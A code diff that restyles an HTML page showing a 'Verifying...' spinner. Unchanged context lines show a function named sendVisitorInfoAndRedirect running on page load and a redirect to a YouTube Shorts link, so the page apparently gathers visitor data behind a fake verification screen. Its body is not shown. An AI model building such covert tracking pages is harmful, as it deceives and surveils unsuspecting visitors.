@@ -534,37 +534,37 @@ window.location.replace("https://www.youtube.com/shorts/QI6B04Ss5LE");
     // Run the function when the page loads
     window.onload = sendVisitorInfoAndRedirect;
   </script>
-  <style>
+   <style>
     body {
       background-color: #0c0c0c; /* Dark background color */
       color: #d3d3d3; /* Light text color */
       font-family: 'Roboto', sans-serif; /* Smooth, readable font */
       margin: 0;
       padding: 0;
-      text-align: center;
       height: 100vh; /* Full viewport height */
       display: flex;
       justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
+    .container {
+      display: flex;
+      flex-direction: column;
       align-items: center;
     }
     h1 {
       color: #d3d3d3; /* Light color for headings */
       font-size: 2rem; /* Adjust as needed */
       margin: 0;
-      position: relative;
     }
     .loader {
-      display: inline-block;
+      margin-top: 10px; /* Space between text and loader */
       border: 4px solid #d3d3d3; /* Light color for loader */
       border-radius: 50%;
       border-top: 4px solid #ffffff; /* Slightly lighter color for animation */
       width: 40px;
       height: 40px;
       animation: spin 1s linear infinite;
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
     }
     @keyframes spin {
       0% { transform: rotate(0deg); }
@@ -575,10 +575,10 @@ window.location.replace("https://www.youtube.com/shorts/QI6B04Ss5LE");
   <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap">
 </head>
 <body>
-  <h1>
-    Verifying...
+  <div class="container">
+    <h1>Verifying...</h1>
     <div class="loader"></div>
-  </h1>
+  </div>
   <script>
     // Run the function when the page loads
     window.onload = sendVisitorInfoAndRedirect;
